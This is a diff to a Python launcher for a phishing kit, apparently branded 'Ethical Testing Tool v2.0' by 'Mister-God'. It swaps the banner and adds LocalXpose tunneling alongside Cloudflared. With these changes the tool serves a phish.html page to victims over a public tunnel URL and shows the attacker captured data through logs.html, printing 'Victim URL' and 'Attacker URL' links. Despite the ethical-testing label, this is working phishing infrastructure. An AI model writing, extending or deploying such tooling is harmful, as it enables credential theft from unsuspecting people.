@@ -7,21 +7,20 @@ import time
 
 CONFIG_FILE = "config.json"
 
-# ASCII Art Banner
+# Display a professional tool banner
 def display_banner():
-    print("\033[1;93m      _______        \033[0m")
-    print("\033[1;93m     /       \\\\      \033[0m")
-    print("\033[1;93m    /  _____  \\\\     \033[0m")
-    print("\033[1;92m   |  |     |  |     \033[0m")
-    print("\033[1;92m   |  | o o |  |     \033[0m")
-    print("\033[1;92m   |  |  ^  |  |     \033[0m")
-    print("\033[1;92m   |  | '-' |  |     \033[0m")
-    print("\033[1;97m    \\  \\___/  /      \033[0m")
-    print("\033[1;97m     \\_______/       \033[0m")
-    print("\033[1;96m     / ||||| \\       \033[0m")
-    print("\033[1;96m    /  |||||  \\      \033[0m")
-    print("\033[1;96m   |___|||||___|     \033[0m")
-    print("\033[1;94m    [ MISTER X ]      \033[0m\n")
+    print("\033[1;92m")
+    print(" ██████╗ ██╗  ██╗██╗██████╗  ██████╗ ██╗   ██╗")
+    print("██╔════╝ ██║  ██║██║██╔══██╗██╔═══██╗██║   ██║")
+    print("██║  ███╗███████║██║██████╔╝██║   ██║██║   ██║")
+    print("██║   ██║██╔══██║██║██╔═══╝ ██║   ██║██║   ██║")
+    print("╚██████╔╝██║  ██║██║██║     ╚██████╔╝╚██████╔╝")
+    print(" ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝      ╚═════╝  ╚═════╝ ")
+    print("\033[1;94m")
+    print("         Ethical Testing Tool v2.0")
+    print("\033[1;93m")
+    print("       Developed by Mister-God")
+    print("\033[0m")
 
 # Load or initialize the configuration file
 def load_config():
@@ -104,12 +103,30 @@ def start_cloudflared(port, timeout=30):
 
     return tunnel_url
 
-# Generate URLs for Victim and Attacker
-def generate_urls(port):
-    base_url = f"http://127.0.0.1:{port}"
-    victim_url = f"{base_url}/phish.html"  # Updated to match existing file
-    attacker_url = f"{base_url}/logs.html"  # Updated to match existing file
-    return victim_url, attacker_url
+# Start LocalXpose and parse the tunnel URL
+def start_localxpose(port, token):
+    print("[*] Starting LocalXpose...")
+    loclx_path = ".server/loclx"
+    if not os.path.exists(loclx_path):
+        print("[!] LocalXpose binary is missing. Attempting to reinstall...")
+        install_localxpose()
+
+    try:
+        process = subprocess.Popen(
+            [loclx_path, "tunnel", "http", f"--port={port}", f"--token={token}"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+
+        for line in process.stdout:
+            print(f"[LocalXpose Log] {line.strip()}")
+            if "https://" in line:
+                return line.strip()
+    except Exception as e:
+        print(f"[!] An error occurred while starting LocalXpose: {e}")
+
+    return None
 
 # Start a PHP server
 def start_php_server(port):
@@ -130,20 +147,29 @@ def main_menu():
 
     if choice == "1":
         start_php_server(port)
-        victim_url, attacker_url = generate_urls(port)
-        print(f"[+] Victim URL: {victim_url}")
-        print(f"[+] Attacker URL: {attacker_url}")
+        print(f"[+] Victim URL: http://127.0.0.1:{port}/phish.html")
+        print(f"[+] Attacker URL: http://127.0.0.1:{port}/logs.html")
     elif choice == "2":
         start_php_server(port)
         tunnel_url = start_cloudflared(port)
         if tunnel_url:
             print(f"[+] Victim Tunnel URL: {tunnel_url}/phish.html")
-            print(f"[+] Attacker Tunnel URL: {tunnel_url}/logs.html")
+            print(f"[+] Attacker URL: http://127.0.0.1:{port}/logs.html")
         else:
             print("[!] Unable to create Cloudflared tunnel.")
     elif choice == "3":
+        token = config.get("localxpose_token")
+        if not token:
+            token = input("Enter your LocalXpose token: ").strip()
+            config["localxpose_token"] = token
+            save_config(config)
         start_php_server(port)
-        print("[*] LocalXpose functionality not yet implemented.")
+        tunnel_url = start_localxpose(port, token)
+        if tunnel_url:
+            print(f"[+] Victim Tunnel URL: {tunnel_url}/phish.html")
+            print(f"[+] Attacker URL: http://127.0.0.1:{port}/logs.html")
+        else:
+            print("[!] Unable to create LocalXpose tunnel.")
     else:
         print("[!] Invalid choice. Exiting.")
 
